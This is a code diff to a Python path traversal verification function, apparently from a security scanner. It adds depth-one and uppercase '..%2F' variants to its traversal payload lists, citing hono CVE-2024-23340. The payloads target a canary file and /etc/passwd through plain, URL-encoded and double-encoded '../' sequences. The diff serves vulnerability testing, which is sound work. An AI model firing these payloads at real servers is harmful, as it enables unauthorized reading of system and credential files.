@@ -2740,10 +2740,13 @@ def verify_generic_path_traversal(
                 _canary_failed = True
 
         rel = canary_path.lstrip("/")
-        depths = (2, 4, 6, 8, 10, 12)
+        # depth=1 added for apps where CWD is one level above /tmp (e.g. hono /app → ../tmp/canary)
+        depths = (1, 2, 4, 6, 8, 10, 12)
         attempts = [rel, canary_path]
         attempts += [("../" * n) + rel for n in depths]
         attempts += [("..%2f" * n) + rel for n in depths]
+        # ..%2F uppercase: required by hono CVE-2024-23340 (serveStatic without root)
+        attempts += [("..%2F" * n) + rel for n in depths]
         attempts += [("%2e%2e%2f" * n) + rel for n in depths]
         attempts += [("%252e%252e%252f" * n) + rel for n in depths]
         attempts += [("..\\" * n) + rel for n in depths]
@@ -2789,8 +2792,9 @@ def verify_generic_path_traversal(
             _etc = "etc/passwd"
             _etc_abs = "/etc/passwd"
             attempts = [_etc_abs, _etc]
-            attempts += [("../" * n) + _etc for n in (2, 4, 6, 8, 10, 12)]
-            attempts += [("..%2f" * n) + _etc for n in (2, 4, 6, 8, 10)]
+            attempts += [("../" * n) + _etc for n in (1, 2, 4, 6, 8, 10, 12)]
+            attempts += [("..%2f" * n) + _etc for n in (1, 2, 4, 6, 8, 10)]
+            attempts += [("..%2F" * n) + _etc for n in (1, 2, 4, 6, 8, 10)]
             attempts += [("%2e%2e%2f" * n) + _etc for n in (2, 4, 6, 8, 10)]
             attempts += [("%252e%252e%252f" * n) + _etc for n in (2, 4, 6, 8)]
             attempts += [("%2e%2e/" * n) + _etc for n in (2, 4, 6, 8)]
